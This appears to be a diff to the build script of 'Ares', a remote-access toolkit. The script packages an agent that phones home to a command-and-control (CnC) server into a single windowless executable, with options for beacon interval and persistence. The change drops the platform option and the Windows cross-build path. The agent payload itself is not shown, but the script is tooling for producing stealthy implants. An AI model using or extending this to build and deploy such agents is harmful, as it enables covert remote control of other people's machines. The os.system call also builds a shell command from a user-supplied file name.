@@ -5,15 +5,8 @@ import shutil
 import tempfile
 
 
-def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist, tls_verify):
+def build_agent(output, server_url, hello_interval, idle_time, max_failed_connections, persist, tls_verify):
     prog_name = os.path.basename(output)
-    platform = platform.lower()
-    if platform not in ['linux', 'windows']:
-        print("[!] Supported platforms are 'Linux' and 'Windows'")
-        exit(0)
-    if os.name != 'posix' and platform == 'linux':
-        print("[!] Can only build Linux agents on Linux.")
-        exit(0)
     working_dir = os.path.join(tempfile.gettempdir(), 'ares')
     if os.path.exists(working_dir):
         shutil.rmtree(working_dir)
@@ -32,17 +25,8 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     cwd = os.getcwd()
     os.chdir(working_dir)
     shutil.move('agent.py', prog_name + '.py')
-    if platform == 'linux':
-        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
-        agent_file = os.path.join(working_dir, 'dist', prog_name)
-    elif platform == 'windows':
-        if os.name == 'posix': 
-            os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
-        else:
-            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
-        if not prog_name.endswith(".exe"):
-            prog_name += ".exe"
-        agent_file = os.path.join(working_dir, 'dist', prog_name)
+    os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+    agent_file = os.path.join(working_dir, 'dist', prog_name)
     os.chdir(cwd)
     os.rename(agent_file, output)
     shutil.rmtree(working_dir)
@@ -52,7 +36,6 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
 def main():
     from argparse import ArgumentParser
     parser = ArgumentParser(description="Builds an Ares agent.")
-    parser.add_argument('-p', '--platform', required=True, help="Target platform (Windows, Linux).")
     parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
     parser.add_argument('-o', '--output', required=True, help="Output file name.")
     parser.add_argument('--hello-interval', type=int, default=10, help="Delay (in seconds) between each request to the CnC.")
@@ -65,7 +48,6 @@ def main():
     build_agent(
         output=args.output,
         server_url=args.server,
-        platform=args.platform,
         hello_interval=args.hello_interval,
         idle_time=args.idle_time,
         max_failed_connections=args.max_failed_connections,
